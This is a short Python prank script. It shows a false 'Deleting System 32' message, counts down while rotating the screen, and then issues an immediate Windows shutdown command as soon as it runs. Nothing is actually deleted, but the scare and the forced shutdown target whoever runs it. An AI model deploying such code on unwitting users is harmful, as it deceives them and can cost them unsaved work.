import sys
import time
import os
import rotatescreen

def loading_sequence():
    loading_sequence = '| / - \\ | / - \\ |'
    return loading_sequence

def countdown(t, screen):
    try:
        while t >= 0:
            sys.stdout.write('\r{} {}'.format(t, loading_sequence()[((10 - t) % (len(loading_sequence()) // 2)) * 2:((10 - t) % (len(loading_sequence()) // 2)) * 2 + 2]))
            sys.stdout.flush()
            rotate_screen_to(screen, (t % 4) * 90)  # Rotate the screen based on the remaining time
            time.sleep(1)
            t -= 1
    except KeyboardInterrupt:
        print("\nCountdown interrupted. Exiting...")
        sys.exit()

def rotate_screen_to(screen, angle):
    screen.rotate_to(angle)

def printt():
    print("Deleting System 32")
    screen = rotatescreen.get_primary_display()
    countdown(10, screen)  # Start countdown with screen rotation
    print("\nGoodbye") # Shutdown the PC after 1 second
    os.system("shutdown /s /t 1") 
# Call the printt() function to see the output
printt()
